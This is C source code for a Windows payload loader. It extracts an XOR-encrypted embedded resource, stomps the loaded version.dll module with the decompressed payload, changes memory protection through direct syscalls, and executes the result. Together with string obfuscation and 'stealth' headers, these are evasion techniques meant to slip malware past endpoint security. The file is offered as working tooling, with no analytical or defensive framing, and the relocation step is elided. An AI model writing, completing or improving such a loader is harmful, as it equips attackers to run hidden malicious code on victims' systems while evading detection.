#include <stdint.h>
#include <stdbool.h>
#include <windows.h>
#include "resource.h"
#include "stealth.h"
#include "obfuscation.h"
#include "syscalls.h"

/**
 * Advanced single-file loader with Module Stomping and Direct Syscalls.
 */

extern int uncompress(unsigned char* dest, unsigned long* destLen, const unsigned char* source, unsigned long sourceLen);

uint8_t* UnpackPayload() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN), RT_RCDATA);
    DWORD payloadSize = SizeofResource(NULL, hRes);
    HGLOBAL hData = LoadResource(NULL, hRes);
    uint8_t* packedData = (uint8_t*)LockResource(hData);

    uint8_t* decryptedBuffer = (uint8_t*)malloc(payloadSize);
    for (DWORD i = 0; i < payloadSize; ++i) decryptedBuffer[i] = packedData[i] ^ 0xAA;

    uint32_t originalSize = *(uint32_t*)decryptedBuffer;

    /**
     * MODULE STOMPING
     * Instead of VirtualAlloc, we load a sacrificial DLL and write our code over it.
     */
    HMODULE hTargetMod = LoadLibraryA(XOR_STR("\x23\x30\x27\x26\x3c\x3a\x3b\x75\x31\x39\x39")); // "version.dll"
    if (!hTargetMod) return NULL;

    PVOID baseAddress = (PVOID)hTargetMod;
    SIZE_T regionSize = originalSize;

    // Use Direct Syscall to change protection of the stomped module
    ULONG oldProtect;
    DirectNtProtectVirtualMemory(GetCurrentProcess(), &baseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    uint8_t* finalBuffer = (uint8_t*)baseAddress;
    unsigned long destLen = originalSize;
    uncompress(finalBuffer, &destLen, decryptedBuffer + 4, payloadSize - 4);

    free(decryptedBuffer);
    return finalBuffer;
}

int main() {
    uint8_t* stomped_image = UnpackPayload();
    if (!stomped_image) return -1;

    // Resolve relocations and imports to run within the version.dll memory space
    // ...

    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t entry = (DllMain_t)((uintptr_t)stomped_image + 0x1000);
    entry((HINSTANCE)stomped_image, DLL_PROCESS_ATTACH, NULL);

    return 0;
}
